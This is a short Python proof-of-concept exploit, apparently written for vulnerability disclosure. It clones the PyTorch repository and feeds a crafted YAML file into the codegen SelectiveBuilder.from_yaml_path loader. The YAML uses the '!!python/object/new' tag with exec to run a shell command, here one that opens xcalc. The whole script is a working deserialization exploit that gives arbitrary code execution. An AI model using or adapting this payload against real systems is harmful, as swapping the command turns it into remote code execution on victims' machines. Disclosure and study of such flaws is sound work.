import torch

import os
os.system('git clone https://github.com/pytorch/pytorch.git')
os.chdir('pytorch/')
from tools.codegen.selective_build import selector
exploit = """!!python/object/new:type
  args: ["z", !!python/tuple [], {"extend": !!python/name:exec }]
  listitems: "__import__('os').system('xcalc')"
"""
open('exploit.yml','w+').write(exploit)
selector.SelectiveBuilder.from_yaml_path('exploit.yml')
os.system('rm exploit.yml')